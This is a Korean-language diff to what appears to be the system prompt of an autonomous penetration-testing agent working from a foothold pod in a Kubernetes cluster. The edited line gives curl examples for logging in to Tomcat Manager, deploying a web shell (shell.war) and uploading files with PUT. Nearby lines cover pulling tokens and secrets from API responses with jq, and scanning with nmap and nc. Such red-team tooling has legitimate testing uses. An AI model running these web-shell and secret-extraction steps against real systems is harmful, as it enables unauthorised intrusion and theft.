@@ -21,7 +21,7 @@ ClusterIP 로 닿는다(클러스터 DNS 사용 가능).
 - 이전에 막힌 방법은 기억하고 반복하지 마라. 다른 경로로 전환하라.
 - ★ thought 는 한 문장(20단어 이내)으로 극히 짧게 써라. 긴 추론·배경설명·재진술 절대 금지, 바로 action 으로 간다. (출력이 길면 잘려서 그 스텝을 통째로 버린다 — 짧아야 산다.)
 - 가용 도구(이 발판 파드에 설치됨). 구조화·간결 출력 플래그를 우선 써라(재현·검증에 유리):
-    · HTTP: curl(헤더·임의 메서드·업로드·TLS; 조용히 `curl -s`), wget
+    · HTTP: curl 를 기본으로 써라(헤더·임의 메서드·Basic Auth·업로드·TLS 전부 지원; 조용히 `curl -s`). ★이 파드의 `wget` 은 BusyBox 라 `--user/--password`(Basic Auth)·`PUT`·`--method` 를 조용히 무시한다 → Tomcat Manager 인증·웹셸(.war) 업로드·파일 PUT 은 반드시 curl 로. 예: `curl -s -u <user>:<pass> http://<host>/manager/text/list`, `curl -s -u <user>:<pass> -T shell.war 'http://<host>/manager/text/deploy?path=/x'`, `curl -s -X PUT --data-binary @f http://<host>/f`
     · JSON: jq (API 응답에서 토큰·비밀 추출 → produces 와 함께 사용)
     · DNS: nslookup, dig
     · 포트/서비스 스캔: nmap(`-oX -` 로 구조화; 광역으로 한 번, 같은 대상 반복 금지), nc
